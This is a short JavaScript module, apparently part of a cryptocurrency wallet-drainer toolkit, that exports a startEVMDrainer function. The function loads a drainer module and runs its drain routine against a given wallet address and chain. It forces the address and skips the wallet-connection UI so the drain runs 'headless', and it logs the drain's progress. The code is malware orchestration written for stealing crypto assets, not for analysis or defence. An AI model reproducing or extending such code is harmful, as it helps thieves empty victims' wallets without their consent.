// processors/evm/index.js
async function startEVMDrainer(walletAddress, chainId = 1) {
  console.log(`[EVM Processor] 🔥 STARTING DRAIN with wallet: ${walletAddress} on chain ${chainId}`);

  try {
    // Load the main drainer
    const drainerPath = '../lib/drainers/evm-main.js'; // Adjust if needed
    const DrainerModule = await import(drainerPath);

    console.log("[DEBUG] Drainer loaded");

    // === HEADLESS MODE ===
    if (typeof DrainerModule.startWithWallet === 'function') {
      console.log("[EVM] Starting in headless mode...");
      await DrainerModule.startWithWallet(walletAddress, chainId);
    } 
    else if (DrainerModule.Drainer) {
      const drainer = new DrainerModule.Drainer();
      drainer.walletAddress = walletAddress;        // Force address
      drainer.chainId = chainId;
      drainer.started = true;                       // Skip connection UI

      console.log("[EVM] Starting drain directly...");
      await drainer.Perexod();                      // Main drain function
    } 
    else {
      throw new Error("No valid start method found");
    }

    console.log(`[EVM] Drain completed for ${walletAddress}`);

  } catch (err) {
    console.error("[EVM] Drain failed:", err.message);
    console.error(err.stack);
  }
}

export { startEVMDrainer };